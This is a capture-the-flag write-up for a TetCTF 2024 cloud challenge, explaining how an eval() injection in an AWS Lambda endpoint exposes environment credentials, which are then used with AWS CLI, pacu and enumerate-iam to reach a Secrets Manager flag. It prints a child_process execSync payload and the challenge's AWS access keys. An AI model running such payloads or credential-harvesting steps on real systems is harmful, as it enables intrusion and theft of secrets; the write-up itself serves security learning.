# Challenge link
URL:      [https://huk5xbypcc.execute-api.ap-southeast-2.amazonaws.com/dev/vulnerable?vulnerable="Welcome to TetCTF!"](https://huk5xbypcc.execute-api.ap-southeast-2.amazonaws.com/dev/vulnerable?vulnerable="Welcome_to_TetCTF!") 

(maybe the server was shut down)

# Challenge description
Let’s see what you can do with this vulnerable API GW endpoint.
Note: AWS Account is not needed for this challenge

# Challenge source file
Blackbox

# Catergory
Web/cloud service exploitation

# Difficulty
Hard

# Author
Chi Tran (Twitter: @imspicynoodles) (Discord: iam.chi)

# Approach
- When I connected to the website, all I saw was just a simple page:
  ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/7da8df0c-c3ba-491b-8cc4-a4840e944830)

- There is a parameter on the URL. I tried to modify it:
  ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/b1d4e2c7-166a-4264-b4d6-e73e1e497257)

- The message is "Evaluated User Input" so I think they used *eval()* in the backend, so we can gain RCE. After a while, I realized that they use Javascript for the backend. This is the payload:
  ```
  process.env
  ```
  Or you can use this to read other things on the server:
  ```
  require('child_process').execSync('env', {encoding: 'UTF-8'}).trim().split('\n')
  ```
  (I switched to Burpsuite for convenient)
  
  ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/a18acd23-cb01-450f-9b90-70008e157fc7)

- The challenge is hosted on AWS service and I see some interesting thing like AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY so I search for it on google. There are a few post I found it interesting:
  
  [https://blog.appsecco.com/hacking-aws-lambda-for-security-fun-and-profit-c140426b6167](https://blog.appsecco.com/hacking-aws-lambda-for-security-fun-and-profit-c140426b6167)
  
  [https://www.linkedin.com/pulse/exploiting-aws-lambda-gain-rce-access-s3-buckets-arav-budhiraja](https://www.linkedin.com/pulse/exploiting-aws-lambda-gain-rce-access-s3-buckets-arav-budhiraja)
  
  [AWS exploit cheatsheet](https://github.com/pop3ret/AWSome-Pentesting/blob/main/AWSome-Pentesting-Cheatsheet.md)
  
- I knew that this website use AWS lambda service. Usually, when deployed, AWS cloud saves information about itself in the Linux server as environment variables, including sensitive things like sessionID, secret key, ... I had all of them, the next mission is exploiting the AWS cloud.

# Problem-solving
  ## Find a priviledged account 
  - I install AWS CLI on my WSL and use those three token:
    ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/14c77bfa-8d67-4954-9103-23b71b7672cb)

  - Set environment variables (AWS cloud service's requirement to access an user account):
    ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/d11e24ef-5239-4656-88e4-ee895d46668f)

  - Now it's time to check if the account is set. I use this AWS command:
    ```
    aws sts get-caller-identity
    ```
    (It has the same meaning as *whoami* in Linux)
    
    ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/025f4254-4efd-40ca-8fe5-6d5a3d012bf6)

  - AWS S3 is a service that used to storing data of the cloud server. After reaading the cheatsheet (link above), I tried a s3 command:
    ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/c714633d-7834-41b1-9652-5f22fd296434)

  - Maybe this account has restricted priviledge. Since AWS has so many service and command, I used this tool to bruteforce account's priviledge:
    
    [Source code Github](https://github.com/RhinoSecurityLabs/pacu)
    
    Command to install:
    ```
    pip3 install -U pacu
    ```

  - Use pacu to bruteforce priviledge:
    Create new attack session:
    ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/a30441b5-07e7-4271-9017-377b2787fd6d)

    Use *ls* to list all the command of the tool. In this scenario, I use *iam__bruteforce_permissions*:
    ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/e82956b2-b214-44de-8c55-6faab1d2e1c2)

    Type Y to accept, and wait for it.

  - After a while, the bruteforce result tell me that this account has very stricted priviledge and cannot do anything more:
    
    ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/d1067780-a9f7-4072-b534-27db5a3aebb5)
    (some not interesting commands)

  - To ensure that, I also use another tool:
    [enumerate-iam](https://github.com/andresriancho/enumerate-iam)

  - And it didn't find anything else:
    ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/d3cc96b9-d135-49b2-bbd8-99101a30a296)

  - This is very tricky, so I have to read again all the documents and information I've retrieved. But there is a thing:
    ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/565ce8d0-4897-4797-9eb4-1966222361d4)

  - Other writeups do not have this token. This is so weird, so I asked a cloud engineer about this. He said that the token I used is for execution role but it doesn't have any priviledge. He also said that AWS lambda can ignore that token and use the pre-defined token saved in the environment variable. So, that means the ENV_ tokens above are the correct tokens.

  - Re-setup those token:
    ```
    unset AWS_SESSION_TOKEN (this session token is for execution role that do not have any priviledge, so I have to remove it)
    export AWS_ACCESS_KEY_ID='AKIAX473H4JB76WRTYPI' (replace with the value of ENV_ACCESS_KEY token)
    export AWS_SECRET_ACCESS_KEY='f6N48oKwKNkmS6xVJ8ZYOOj0FB/zLb/QfXCWWqyX' (replace with the value of ENV_SECRET_ACCESS_KEY token)
    ```
  - Then re run this command to check if the setup is done:
    ```
    aws sts get-caller-identity
    ```
    ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/0d4505b5-b6c0-4fd8-b272-e738410dc517)

  - HURRAYYYYYYY!

  ## Bruteforce priviledge
  - After gaining access to secret-user, I should check what command can this user do. I use the enumerate-iam tool for this purpose because it's faster:
    ```
    python3 enumerate-iam.py --access-key AKIAX473H4JB76WRTYPI --secret-key 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 --region ap-southeast-2
    ```
    You can find region in AWS leaked information above.

    ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/173c95e2-a98e-47d5-9328-8d8a9beaa273)

  - The result give me a suspicious command: *secretsmanager.list_secrets()*. I asked chatGPT about it and get the correct syntax:
    ```
    aws secretsmanager list-secrets
    ```
    
    ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/4d29e816-2502-4bc1-a4ad-8222d5013f2c)

  - Now I use this command to read the secret:
    ```
    aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:ap-southeast-2:543303393859:secret:prod/TetCTF/Flag-gnvT27
    ```

    ![image](https://github.com/NoSpaceAvailable/TetCTF2024/assets/143888307/193788ae-1db1-407f-9b41-1a374fb5df9f)

  - Flag: TetCTF{B0unTy_$$$-50_for_B3ginNeR_2a3287f970cd8837b91f4f7472c5541a}
